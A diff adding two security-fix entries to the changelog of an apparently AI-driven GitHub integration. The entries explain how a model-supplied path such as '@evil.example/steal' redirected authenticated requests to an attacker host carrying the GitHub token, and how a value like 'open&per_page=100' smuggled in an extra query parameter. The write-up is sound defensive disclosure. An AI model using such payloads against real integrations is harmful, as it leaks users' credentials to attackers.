@@ -34,6 +34,26 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   resolves somewhere unexpected is caught too. Both entry points validate
   before opening the keyring, so a refused address no longer costs a
   keychain unlock or pulls proxy secrets into memory first.
+- Integration requests can no longer be retargeted at another host.
+  `apiclient.Do` built its URL as `baseURL + path`, and `github_api`
+  takes that path straight from the model, so a path of
+  `@evil.example/steal` produced
+  `https://api.github.com@evil.example/steal` — which parses as host
+  `evil.example` with `api.github.com` demoted to userinfo. The request
+  went to the attacker carrying the injected
+  `Authorization: Bearer <GITHUB_TOKEN>`, handing over the very
+  credential the integration exists to keep out of the model's reach.
+  Paths are now parsed as a relative reference and resolved against the
+  base URL, and the result is rejected unless its scheme and host still
+  match the integration's own.
+- GitHub tool parameters are URL-escaped instead of concatenated.
+  `buildQuery` built `key=value` pairs by hand, so a `state` of
+  `open&per_page=100` smuggled in a second parameter; it now goes
+  through `url.Values`. Path parameters are escaped per segment, so an
+  `owner`, `repo`, or file path containing `/`, `?`, or `#` stays one
+  segment instead of reaching a different endpoint. `github_get_file`
+  additionally refuses `.` and `..` segments, which address an API
+  endpoint rather than a file in the repository.
 
 ## [0.5.0] - 2026-05-25
 
